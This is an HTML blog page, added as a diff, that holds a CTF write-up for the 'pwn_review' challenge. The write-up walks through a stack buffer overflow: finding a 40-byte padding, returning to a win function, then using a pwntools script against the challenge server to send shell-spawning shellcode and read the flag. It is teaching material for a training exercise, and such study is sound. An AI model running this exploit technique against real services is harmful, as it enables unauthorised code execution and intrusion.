@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="A simple review challenge. Let&amp;rsquo;s see how it goes :3
+So running the binary, we get some info:
+This is a review challenge, you know the drill Return to the win function and get the flag gimme win function Ok, so we need to return to the win function. My guess is that this program is going to be susceptible to a buffer overflow. Turns out it is! After screaming at it for a bit, I was able to determine the buffer was 32 bytes, so our padding will be 40 bytes." />
+<meta name="keywords" content=", osuleague, ctf, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/blog/pwn_review/" />
+
+
+    <title>
+        
+            OSU League 2020/2021 - pwn_review Writeup :: Cameron McCawley 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7bdd8ee18bfbf4c605488a7e5b1b92cd980dfeed2bdaeab4dd5e931a7a78bc0.css">
+
+
+
+
+
+
+<meta itemprop="name" content="OSU League 2020/2021 - pwn_review Writeup">
+<meta itemprop="description" content="A simple review challenge. Let&rsquo;s see how it goes :3
+So running the binary, we get some info:
+This is a review challenge, you know the drill Return to the win function and get the flag gimme win function Ok, so we need to return to the win function. My guess is that this program is going to be susceptible to a buffer overflow. Turns out it is! After screaming at it for a bit, I was able to determine the buffer was 32 bytes, so our padding will be 40 bytes.">
+<meta itemprop="datePublished" content="2020-10-30T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2020-10-30T00:00:00+00:00" />
+<meta itemprop="wordCount" content="448">
+<meta itemprop="image" content=""/>
+
+
+
+<meta itemprop="keywords" content="osuleague,ctf,security," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="OSU League 2020/2021 - pwn_review Writeup"/>
+<meta name="twitter:description" content="A simple review challenge. Let&rsquo;s see how it goes :3
+So running the binary, we get some info:
+This is a review challenge, you know the drill Return to the win function and get the flag gimme win function Ok, so we need to return to the win function. My guess is that this program is going to be susceptible to a buffer overflow. Turns out it is! After screaming at it for a bit, I was able to determine the buffer was 32 bytes, so our padding will be 40 bytes."/>
+
+
+
+
+    <meta property="og:title" content="OSU League 2020/2021 - pwn_review Writeup" />
+<meta property="og:description" content="A simple review challenge. Let&rsquo;s see how it goes :3
+So running the binary, we get some info:
+This is a review challenge, you know the drill Return to the win function and get the flag gimme win function Ok, so we need to return to the win function. My guess is that this program is going to be susceptible to a buffer overflow. Turns out it is! After screaming at it for a bit, I was able to determine the buffer was 32 bytes, so our padding will be 40 bytes." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog/pwn_review/" />
+<meta property="og:image" content=""/>
+<meta property="article:published_time" content="2020-10-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-10-30T00:00:00+00:00" /><meta property="og:site_name" content="Cameron McCawley" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-10-30 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/cameronmccawley</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/blog/">Blog</a></li><li><a href="/resume.pdf">Resume</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/blog/pwn_review/">OSU League 2020/2021 - pwn_review Writeup</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>A simple review challenge.  Let&rsquo;s see how it goes :3</p>
+<p>So running the binary, we get some info:</p>
+<pre><code>This is a review challenge, you know the drill
+Return to the win function and get the flag
+gimme win function
+</code></pre><p>Ok, so we need to return to the win function.  My guess is that this program is going to be susceptible to a buffer overflow.  Turns out it is!  After screaming at it for a bit, I was able to determine the buffer was 32 bytes, so our padding will be 40 bytes.</p>
+<pre><code>gdb-peda$ r
+Starting program: /home/perchik/CTF/osuleague/week4/pwn_review
+This is a review challenge, you know the drill
+Return to the win function and get the flag
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+</code></pre><p>Sweet, we crashed, and if we look at RBP, we can see we have overwritten it with our Bs. <code>RBP: 0x4242424242424242 ('BBBBBBBB')</code>
+That means whatever comes next will overwrite the instruction pointer, so we can return to wherever we want!</p>
+<p>So let&rsquo;s actually find the address we want to return to.  We can use <code>objdump -d pwnreview | grep win</code> to find the location of the win function.
+<code>0000000000400577 &lt;win&gt;:</code></p>
+<p>Great. So we know our padding will be 40 bytes, and we have the address.  So let&rsquo;s put what we have together so far in python:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys
+<span style="color:#75715e">#io = process(&#39;./pwn_review&#39;)</span>
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;ctf.ropcity.com&#39;</span>, <span style="color:#ae81ff">31337</span>)
+
+context(arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>)
+
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
+win <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x400577</span>)
+payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> win
+
+log<span style="color:#f92672">.</span>info(payload)
+
+io<span style="color:#f92672">.</span>sendline(payload)
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>And running it we get:</p>
+<pre><code>[+] Opening connection to ctf.ropcity.com on port 31337: Done
+[*] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw\x05@\x00\x00\x00\x00\x00
+[*] Switching to interactive mode
+This is a review challenge, you know the drill
+Return to the win function and get the flag
+nice! I'll execute any shellcode you give me now
+$ booop?
+[*] Got EOF while reading in interactive
+$
+$
+[*] Closed connection to ctf.ropcity.com port 31337
+[*] Got EOF while sending in interactive
+</code></pre><p>Hmm, looks like we aren&rsquo;t done quite yet.  We are give a prompt to enter some shell code.  So let&rsquo;s add a few more lines to our exploit that will spawn a shell for us.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys
+<span style="color:#75715e">#io = process(&#39;./pwn_review&#39;)</span>
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;ctf.ropcity.com&#39;</span>, <span style="color:#ae81ff">31337</span>)
+
+context(arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>)
+
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
+win <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x400577</span>)
+
+shell <span style="color:#f92672">=</span> shellcraft<span style="color:#f92672">.</span>sh() <span style="color:#75715e">#Pwntools shellcraft OP</span>
+shellcode <span style="color:#f92672">=</span> asm(shell)
+
+payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> win
+log<span style="color:#f92672">.</span>info(payload)
+
+io<span style="color:#f92672">.</span>sendline(payload)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;you give me now&#34;</span>)
+
+io<span style="color:#f92672">.</span>sendline(shellcode)
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>And running it we get a shell!:</p>
+<pre><code>[+] Opening connection to ctf.ropcity.com on port 31337: Done
+[*] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw\x05@\x00\x00\x00\x00\x00
+[*] Switching to interactive mode
+
+$ ls
+flag
+pwn_review
+$ cat flag
+osu{pwnt00ls_i$_Ch3A7iNG}
+</code></pre><p>This was a pretty sick review covering the stuff we have learned so far! GG</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="tags/osuleague/">osuleague</a></span>
+        <span class="tag"><a href="tags/ctf/">ctf</a></span>
+        <span class="tag"><a href="tags/security/">security</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span><span><a href="posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.af435e44374f1e99a669ea8cd5bb9a2fceed80588941a451bfddb66b86a67c9f40b0f417e9543a763f809aa7e9300d7b1d69bf99615810ba02ac70396d50fad5.js" integrity="sha512-r0NeRDdPHpmmaeqM1buaL87tgFiJQaRRv922a4amfJ9AsPQX6VQ6dj&#43;AmqfpMA17HWm/mWFYELoCrHA5bVD61Q=="></script>
+
+
+
+    </body>
+</html>
